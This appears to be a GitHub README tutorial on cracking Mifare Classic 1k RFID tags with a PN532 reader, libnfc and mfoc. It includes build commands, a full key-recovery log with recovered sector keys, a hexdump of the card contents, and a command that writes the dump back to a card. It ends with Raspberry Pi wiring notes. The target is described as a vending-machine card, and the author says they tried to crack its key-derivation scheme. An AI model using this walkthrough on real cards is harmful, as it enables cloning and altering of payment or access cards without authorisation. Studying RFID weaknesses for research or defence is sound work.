# How to Crack Mifare 1k RFID card

The NFC tag I analyzed is a so called “Mifare Classic 1k” tag. 1k stands for the size of data the tag can store. There are also other types like the “Mifare Classic 4k” and the “Mifare Mini” each having a different memory size.

A Mifare Classic 1k tag contains 16 sectors. Each of these sectors has 3 blocks of data storage and 1 block for storing the secret access keys and access controls. Each block contains 16 bytes of data. Before reading a sector, the reader must authenticate to the tag with a secret access key. Each sector has two keys: Key A and Key B Each of the 16 sectors can define it’s own access right and wich key is needed for a particular action. As an example you can define to use Key A for reading the block and Key B for writing to it. Sector 0 Block 0 also contains a non changeable UID (the tags unique ID) and some manufacturer data. This section is only writeable on some special chinese tags.

Here is a basically memory layout of a Mifare Classic tag:
![server 1](https://github.com/hootan09/rfidCrack/blob/master/pic/mifare_memory_layout.png)

#### Important notice: NFC and the used attack depend a lot on timing. Connecting a NFC device to a VM running linux will not work reliable because the drivers mess with this timing. I spent a lot of time finding this out, so please boot into a linux live cd for the following example or use a Raspberry Pi.

### TODO
```sh
apt-get install autoconf libtool libusb-dev libpcsclite-dev build-essential
wget https://github.com/nfc-tools/libnfc/releases/download/libnfc-1.7.1/libnfc-1.7.1.tar.bz2 #added this package
tar -jxvf libnfc-1.7.1.tar.bz2
cd libnfc-1.7.1
autoreconf -vis
./configure --with-drivers=all --sysconfdir=/etc --prefix=/usr
make
sudo make install
sudo mkdir /etc/nfc
sudo mkdir /etc/nfc/devices.d
```
When using the USB TTL cable issue the following command:

```sh
sudo cp contrib/libnfc/pn532_via_uart2usb.conf.sample /etc/nfc/devices.d/pn532_via_uart2usb.conf
```

If you connect the breakout board directly to your Raspberry PI’s UART pins you need to copy the following file:

```sh
sudo cp contrib/libnfc/pn532_uart_on_rpi.conf.sample /etc/nfc/devices.d/pn532_uart_on_rpi.conf
```

There are other config files like SPI too, just look in the contrib/libnfc/ folder and select the appropriate file.
If you use Kali the libnfc library is already installed, but missing some drivers (in my case the uart driver). You can overwrite the Kali installation with the setup from above.

After installing we need to test the communication to the NFC-reader. Connect your NFC device and run the following command
```sh
nfc-list
```
it should output something like (example with USB-UART Cable)

```sh
# nfc-list
nfc-list uses libnfc 1.7.1
NFC device: pn532_uart:/dev/ttyUSB0 opened
```

On a Raspberry Pi it shows
```sh
# nfc-list
nfc-list uses libnfc 1.7.1
NFC device: pn532_uart:/dev/ttyAMA0 opened
```
## mfoc 

Now your reader is connected and we can start cracking our keys. We will use the tool “mfoc - Mifare Classic Offline Cracker” available from https://github.com/nfc-tools/mfoc. Kali linux has it already installed.

If you are not on KALI or you want the latest version of mfoc you need to compile it on your own by executing the following commands.

```sh
wget -O mfoc-master.zip https://github.com/nfc-tools/mfoc/archive/master.zip #added this package
unzip mfoc-master.zip
cd mfoc-master/
```
or clone via git

```sh
git clone https://github.com/nfc-tools/mfoc.git
cd mfoc/
autoreconf -vis
./configure
make
make install
```

### start cracking
To start the key cracking connect your reader, place the tag on the antenna and run
```sh
mfoc -O output.mfd
```
If the tool outputs “Maybe you should increase the number of probes”, the cracking was not successful. I got this message when running in a VMWare environment or by using crappy hardware. Switching to the Adafruit breakout board and a dedicated linux solved the problem for me.

If you manage to crack all the keys you can see the HEX encoded contents of the key on your terminal and also in the output file output.mfd.

```sh
# mfoc -O output.mfd
Found Mifare Classic 1k tag
ISO/IEC 14443A (106 kbps) target:
    ATQA (SENS_RES): 00  04
* UID size: single
* bit frame anticollision supported
       UID (NFCID1): 8e  db  1a  2a
      SAK (SEL_RES): 08
* Not compliant with ISO/IEC 14443-4
* Not compliant with ISO/IEC 18092

Fingerprinting based on MIFARE type Identification Procedure:
* MIFARE Classic 1K
* MIFARE Plus (4 Byte UID or 4 Byte RID) 2K, Security level 1
* SmartMX with MIFARE 1K emulation
Other possible matches based on ATQA & SAK values:

Try to authenticate to all sectors with default keys...
Symbols: '.' no key found, '/' A key found, '\' B key found, 'x' both keys found
[Key: ffffffffffff] -> [................]
[Key: a0a1a2a3a4a5] -> [////////////////]
[Key: d3f7d3f7d3f7] -> [////////////////]
[Key: 000000000000] -> [////////////////]
[Key: b0b1b2b3b4b5] -> [xxxxxxxxxxxx////]
[Key: 4d3a99c351dd] -> [xxxxxxxxxxxx////]
[Key: 1a982c7e459a] -> [xxxxxxxxxxxx////]
[Key: aabbccddeeff] -> [xxxxxxxxxxxx////]
[Key: 714c5c886e97] -> [xxxxxxxxxxxx////]
[Key: 587ee5f9350f] -> [xxxxxxxxxxxx////]
[Key: a0478cc39091] -> [xxxxxxxxxxxx////]
[Key: 533cb6c723f6] -> [xxxxxxxxxxxx////]
[Key: 8fd0a4f256e9] -> [xxxxxxxxxxxx////]

Sector 00 -  FOUND_KEY   [A]  Sector 00 -  FOUND_KEY   [B]
Sector 01 -  FOUND_KEY   [A]  Sector 01 -  FOUND_KEY   [B]
Sector 02 -  FOUND_KEY   [A]  Sector 02 -  FOUND_KEY   [B]
Sector 03 -  FOUND_KEY   [A]  Sector 03 -  FOUND_KEY   [B]
Sector 04 -  FOUND_KEY   [A]  Sector 04 -  FOUND_KEY   [B]
Sector 05 -  FOUND_KEY   [A]  Sector 05 -  FOUND_KEY   [B]
Sector 06 -  FOUND_KEY   [A]  Sector 06 -  FOUND_KEY   [B]
Sector 07 -  FOUND_KEY   [A]  Sector 07 -  FOUND_KEY   [B]
Sector 08 -  FOUND_KEY   [A]  Sector 08 -  FOUND_KEY   [B]
Sector 09 -  FOUND_KEY   [A]  Sector 09 -  FOUND_KEY   [B]
Sector 10 -  FOUND_KEY   [A]  Sector 10 -  FOUND_KEY   [B]
Sector 11 -  FOUND_KEY   [A]  Sector 11 -  FOUND_KEY   [B]
Sector 12 -  FOUND_KEY   [A]  Sector 12 -  UNKNOWN_KEY [B]
Sector 13 -  FOUND_KEY   [A]  Sector 13 -  UNKNOWN_KEY [B]
Sector 14 -  FOUND_KEY   [A]  Sector 14 -  UNKNOWN_KEY [B]
Sector 15 -  FOUND_KEY   [A]  Sector 15 -  UNKNOWN_KEY [B]


Using sector 00 as an exploit sector
Sector: 12, type B, probe 0, distance 18504 .....
  Found Key: B [ad4fb33388bf]
Sector: 13, type B, probe 0, distance 18502 .....
  Found Key: B [2a6d9205e7ca]
Sector: 14, type B, probe 0, distance 18500 .....
Sector: 14, type B, probe 1, distance 18502 .....
Sector: 14, type B, probe 2, distance 18502 .....
  Found Key: B [b8a1f613cf3d]
Sector: 15, type B, probe 0, distance 18502 .....
  Found Key: B [bedb604cc9d1]
Auth with all sectors succeeded, dumping keys to a file!
Block 63, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  4b  44  bb  5a  00  00  00  00  00  00
Block 62, type A, key a0a1a2a3a4a5 :00  00  51  5f  03  59  ef  00  00  00  00  00  4d  49  43  00
Block 61, type B, key bedb604cc9d1 :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 60, type B, key bedb604cc9d1 :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 59, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  0f  00  ff  e5  00  00  00  00  00  00
Block 58, type B, key b8a1f613cf3d :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 57, type B, key b8a1f613cf3d :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 56, type B, key b8a1f613cf3d :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 55, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  0f  00  ff  4f  00  00  00  00  00  00
Block 54, type B, key 2a6d9205e7ca :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 53, type B, key 2a6d9205e7ca :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 52, type B, key 2a6d9205e7ca :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 51, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  1e  11  ee  5a  00  00  00  00  00  00
Block 50, type B, key ad4fb33388bf :00  01  59  01  00  6f  00  01  00  00  00  00  8c  c3  00  00
Block 49, type B, key ad4fb33388bf :01  01  01  ee  ee  ee  ee  ee  00  00  00  00  00  00  00  00
Block 48, type A, key a0a1a2a3a4a5 :88  01  00  84  00  04  b0  1a  00  00  5d  00  01  05  00  f1
Block 47, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 46, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 45, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 44, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 43, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 42, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 41, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 40, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 39, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 38, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 37, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 36, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 35, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 34, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 33, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 32, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 31, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 30, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 29, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 28, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 27, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 26, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 25, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 24, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 23, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 22, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 21, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 20, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 19, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 18, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 17, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 16, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 15, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 14, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 13, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 12, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 11, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 10, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 09, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 08, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 07, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 06, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 05, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 04, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 03, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  61  e7  89  c1  00  00  00  00  00  00
Block 02, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  09  38  09  38  09  38  09  38
Block 01, type A, key a0a1a2a3a4a5 :d2  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 00, type A, key a0a1a2a3a4a5 :8e  db  1a  2a  65  88  04  00  48  85  14  90  59  80  01  11
```

The terminal output is upside down - the first block containing the UID is at the bottom. If you view the output.mfd file with hexdump you can see it in the right order.

```sh
# hexdump -vC output.mfd
00000000  8e db 1a 2a 65 88 04 00  48 85 14 90 59 80 01 11  |...*e...H...Y...|
00000010  d2 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000020  00 00 00 00 00 00 00 00  09 38 09 38 09 38 09 38  |.........8.8.8.8|
00000030  a0 a1 a2 a3 a4 a5 61 e7  89 c1 b0 b1 b2 b3 b4 b5  |......a.........|
00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000070  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000b0  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000f0  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
00000100  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000120  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000130  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000160  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000170  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
00000180  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000190  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000001a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000001b0  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
000001c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000001d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000001e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000001f0  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
00000200  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000210  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000220  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000230  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
00000240  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000250  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000260  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000270  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
00000280  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000290  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000002a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000002b0  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
000002c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000002d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000002e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000002f0  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
00000300  88 01 00 84 00 04 b0 1a  00 00 5d 00 01 05 00 f1  |..........].....|
00000310  01 01 01 ee ee ee ee ee  00 00 00 00 00 00 00 00  |................|
00000320  00 01 59 01 00 6f 00 01  00 00 00 00 8c c3 00 00  |..Y..o..........|
00000330  a0 a1 a2 a3 a4 a5 1e 11  ee 5a ad 4f b3 33 88 bf  |.........Z.O.3..|
00000340  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
00000350  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
00000360  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
00000370  a0 a1 a2 a3 a4 a5 0f 00  ff 4f 2a 6d 92 05 e7 ca  |.........O*m....|
00000380  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
00000390  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
000003a0  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
000003b0  a0 a1 a2 a3 a4 a5 0f 00  ff e5 b8 a1 f6 13 cf 3d  |...............=|
000003c0  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
000003d0  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
000003e0  00 00 51 5f 03 59 ef 00  00 00 00 00 4d 49 43 00  |..Q_.Y......MIC.|
000003f0  a0 a1 a2 a3 a4 a5 4b 44  bb 5a be db 60 4c c9 d1  |......KD.Z..`L..|
```
The file shows all 16 sectors. Here is an example of one sector: 3x16 bytes of data followed by 16 bytes of access keys and accecss bits.

```sh
Block 0 | 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
Block 1 | 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
Block 2 | 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
Block 3 | a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5
```

This is an empty block, Key A is a0 a1 a2 a3 a4 a5, Key B is b0 b1 b2 b3 b4 b5 and the access bits are 78 77 88. The value 69 is contained in a special register available for user data (see the Mifare Classic Datasheet for more information).

to reflash the captured output of mfoc via nfc-mfclassic:

```sh
# nfc-mfclassic w B output.mfd output.mfd
NFC reader: pn532_uart:/dev/ttyUSB0 opened
Found MIFARE Classic card:
ISO/IEC 14443A (106 kbps) target:
    ATQA (SENS_RES): 00  04
       UID (NFCID1): 8e  db  1a  2a
      SAK (SEL_RES): 08
Guessing size: seems to be a 1024-byte card
Writing 64 blocks |..failed to write trailer block 3
x............................................................|
Done, 62 of 64 blocks written.
```

After examining other tags for the same vending machine I noticed that these all have different keys. It seems like the vending machine calculates the keys based on the tags unique UID or something else to add an extra layer of security. So far I have not managed to crack the scheme.

### Tested hardware (RFID Reader)
PN532:

![server 1](https://github.com/hootan09/rfidCrack/blob/master/pic/mifare_breakoutboard_thumb.jpg)
![server 1](https://github.com/hootan09/rfidCrack/blob/master/pic/PN532-5.jpg)

ACR122U:

![server 1](https://github.com/hootan09/rfidCrack/blob/master/pic/ASC1.png)


### connect PN532 to pi:

![server 1](https://github.com/hootan09/rfidCrack/blob/master/pic/rp2_pinout.png)

| Pi3 PIN # | PN532 |
| ------------- | ------------- |
| #2  | VCC  |
| #6  | GND  |
| #8  | RXD  |
| #10  | TXD  |

## config Pi3:

```sh
# raspi-config //goto advance option and set SPI,Serial,I2C => Disable
# reboot
$ sudo nano /boot/config.txt //search and set 'enable_uart=1'
````

## other connection I2c,SPI,UART /etc/libnfc/devices.d
```sh
#UART
name = "PN532 board via UART"
connstring = pn532_uart:/dev/ttyAMA0

#I2C
#device.name = "_PN532_I2c"
#device.connstring = "pn532_i2c:/dev/i2c-1"

#SPI
#device.name = "_PN532_SPI"
#device.connstring = "pn532_spi:/dev/spidev0.0:280000"
```
if you want to use SPI or I2c ,you must enable it in #raspi-config 'advance option'

### I2C

| PN532 NFC | Raspberry Pi |
| ------------- | ------------- |
| VCC  | 5V/3.3V  |
| GND  | GND  |
| SDA  | I2C1 SDA  |
| SCL  | I2C1 SCL  |

the try this command to check whether the I2C device is recognized
```sh
$i2cdetect  -y  1
```
also works #nfc-list and #nfc-poll

### SPI
![server 1](https://github.com/hootan09/rfidCrack/blob/master/pic/spi-mode.png)

| PN532 NFC | Raspberry Pi |
| ------------- | ------------- |
| VCC  | 5V/3.3V  |
| GND  | GND  |
| SCK  | SPI0 SCKL  |
| MISO  | SPI0 MISO  |
| MOSI  | SPI0 MOSI  |
| SS/SDA  | CE0/CS0  |

now both works #nfc-list and #nfc-poll
